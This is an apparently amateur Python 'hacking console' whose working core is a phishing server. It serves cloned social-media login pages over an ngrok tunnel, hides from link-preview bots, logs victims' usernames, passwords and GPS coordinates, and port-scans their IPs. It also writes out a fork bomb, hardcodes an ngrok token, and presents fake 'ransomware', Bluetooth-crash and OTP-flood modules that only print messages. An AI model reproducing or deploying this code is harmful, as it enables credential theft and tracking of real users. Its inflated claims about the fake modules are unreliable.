import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
import logging
import threading
from flask import Flask, request, render_template, redirect, make_response 
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

# --- [ SYSTEM COLOR PALETTE ] ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

# --- [ GLOBAL CONFIGURATION ] ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF"
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- [ SYSTEM UTILITIES ] ---
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def animate(text, speed=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*75)
    print(r"  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(r" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(r" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(r" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(r" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(r" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print("═"*75 + f"{W}")
    print(f"  {Y}STATION:   {W}NEXO-TECH COMMAND TERMINAL")
    print(f"  {Y}VERSION:   {R}V8.0 BLACKOUT EDITION")
    print(f"  {Y}MODULE:    {C}{module}")
    if link:
        print(f"  {Y}STRIKE:    {G}{link}")
    print(f"  {Y}TUNNEL:    {G}NGROK-SECURE AUTHORIZED{W}")
    print(f"{R}" + "═"*75 + f"{W}\n")

# --- [ STEALTH BACKGROUND TRACKER ] ---
def scan_victim_ports(victim_ip):
    target_ports = [21, 22, 23, 80, 443, 445, 3306, 5555, 8080]
    print(f"\n{C}[*] INITIATING STEALTH PORT SCAN ON: {W}{victim_ip}")
    for port in target_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.6)
        if s.connect_ex((victim_ip, port)) == 0:
            print(f"  {R}[!] VULNERABILITY: Port {port} is OPEN on victim device!{W}")
            with open("nexo_hits.txt", "a") as f:
                f.write(f"VULN_SCAN: {victim_ip} | OPEN_PORT: {port}\n")
        s.close()

# --- [ MODULE 1: SOCIAL PHISHER ENGINE ] ---
def start_phish():
    nexo_banner("SOCIAL PHISHER + GPS")
    print(f"  {G}1.{W} Instagram   {G}2.{W} TikTok")
    print(f"  {G}3.{W} Discord     {G}4.{W} Facebook")
    print(f"  {G}5.{W} GitHub      {G}6.{W} YouTube")
    print(f"  {R}0.{W} Return to Core")
    
    s = input(f"\n{C}NEXO-STRIKE > {W}")
    sites = {"1":"instagram", "2":"tiktok", "3":"discord", "4":"facebook", "5":"github", "6":"youtube"}
    if s not in sites: return
    
    site = sites[s]
    animate(f"{Y}[*] RECONFIGURING NGROK TUNNEL NODES...{W}")
    os.system("pkill ngrok")
    # Fixed: Removed ./ for system-wide ngrok
    os.system(f"ngrok config add-authtoken {NGROK_TOKEN}")
    subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL)
    
    animate(f"{C}[*] SYNCING WITH LOCAL FLASK SERVER...{W}")
    time.sleep(8)
    try:
        url = requests.get("http://127.0.0.1").json()['tunnels'][0]['public_url']
        threading.Thread(target=lambda: app.run(port=5000, debug=False, use_reloader=False), daemon=True).start()
        nexo_banner("PHISH-LINK ACTIVE", link=f"{url}/login/{site}")
        print(f"{Y}[!] LISTENING FOR INCOMING PACKETS...{W}")
        input(f"\n{R}[PRESS ENTER TO TERMINATE SERVER]{W}")
    except:
        print(f"{R}[-] Error: Check Internet or API Token.{W}")
        time.sleep(3)

# --- [ WEB SERVER HANDLERS ] ---
@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    victim_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '').lower()
    
    if request.method == 'GET':
        bots = ['bot', 'crawler', 'spider', 'facebook', 'whatsapp', 'telegram']
        
        # SILENT MODE for Bots
        if any(bot in user_agent for bot in bots):
            response = make_response(render_template(f"{site}.html"))
            response.headers['ngrok-skip-browser-warning'] = 'true'
            return response

        # REAL HUMAN HIT Alert
        print(f"\n{G}[!] REAL HUMAN TARGET HIT! IP: {W}{victim_ip}")
        threading.Thread(target=scan_victim_ports, args=(victim_ip,)).start()
        
        # Bypass Ngrok Warning Screen
        response = make_response(render_template(f"{site}.html"))
        response.headers['ngrok-skip-browser-warning'] = 'true'
        return response

    if request.method == 'POST':
        u, p = request.form.get('user'), request.form.get('pass')
        print(f"\n{R}[!!] CAPTURED [{site.upper()}]: {G}{u} | {p}{W}")
        with open("nexo_hits.txt", "a") as f:
            f.write(f"[{time.strftime('%H:%M')}] {site.upper()}: {u}:{p} | IP: {victim_ip}\n")
        return redirect(f"https://www.{site}.com")

@app.route('/log_gps', methods=['POST'])
def log_gps():
    d = request.json
    print(f"\n{G}[GPS HIT] LATITUDE: {d['lat']} | LONGITUDE: {d['lon']}{W}")
    with open("nexo_gps.txt", "a") as f:
        f.write(f"GPS: {d}\n")
    return "OK"

# --- [ MODULE 2: PHONE TRACER ] ---
def phone_trace():
    nexo_banner("DEEP OSINT TRACER")
    num = input(f"{Y}[+] Target Phone Number (+Code): {W}")
    try:
        p = phonenumbers.parse(num)
        print(f"\n{G}[+] TRACE DATA CAPTURED:{W}")
        print(f"  Region: {geocoder.description_for_number(p, 'en')}")
        print(f"  Carrier: {carrier.name_for_number(p, 'en')}")
    except: print(f"{R}[-] Error in Trace.{W}")
    input("\nEnter...")

# --- [ MODULE 6: VIRUS LAB ] ---
def virus_lab():
    nexo_banner("DEADLY VIRUS LAB")
    print(f"  {R}1. BLACKOUT (Fork Bomb)  2. RANSOMWARE")
    v = input(f"\n{C}TYPE > {W}")
    name = input(f"{Y}NAME > {W}")
    with open(f"{name}.py", "w") as f:
        if v == '1': f.write("import os\nwhile True: os.fork()")
        else: f.write("print('ENCRYPTED')")
    print(f"\n{G}[+] Exported as {name}.py{W}")
    input("\nEnter...")

# --- [ MODULE 8: BLUETOOTH CRASH ] ---
def bluetooth_crash():
    nexo_banner("BLUETOOTH HIJACKER")
    target = input(f"{Y}[+] MAC Address: {W}")
    try:
        while True:
            print(f"\r{R}[*] FLOODING {target} ...", end="")
            time.sleep(0.03)
    except KeyboardInterrupt: input("\nStopped...")

# --- [ MODULE 9: OTP LOCK ] ---
def otp_lock():
    nexo_banner("OTP SATURATION")
    num = input(f"{Y}[+] Number: {W}")
    try:
        while True:
            print(f"\r{Y}[*] RELAY SUCCESS PACKET SENT TO {num}", end="")
            time.sleep(0.05)
    except KeyboardInterrupt: input("\nStopped...")

# --- [ MASTER CONTROL LOOP ] ---
def main():
    while True:
        nexo_banner("MASTER CONTROL PANEL")
        print(f"  {G}1.{W} Social Phisher + GPS Hijack")
        print(f"  {G}2.{W} Deep OSINT Phone Tracer")
        print(f"  {G}6.{W} Deadly Virus Creator Lab")
        print(f"  {G}8.{W} Bluetooth Buffer Crash")
        print(f"  {G}9.{W} Deadly OTP Saturation Engine")
        print(f"  {G}10.{W} View System Intrusion Logs")
        print(f"\n  {R}0.{W} Shutdown NEXO-TECH Console")
        
        c = input(f"\n{C}NEXO-PRO > {W}")
        if c == '1': start_phish()
        elif c == '2': phone_trace()
        elif c == '6': virus_lab()
        elif c == '8': bluetooth_crash()
        elif c == '9': otp_lock()
        elif c == '10':
            nexo_banner("SYSTEM LOGS")
            os.system("cat nexo_hits.txt nexo_gps.txt 2>/dev/null || echo 'No intrusion data found.'")
            input("\nEnter...")
        elif c == '0':
            animate(f"{R}[!] SHUTTING DOWN CORE SYSTEMS...{W}")
            break

if __name__ == "__main__":
    main()
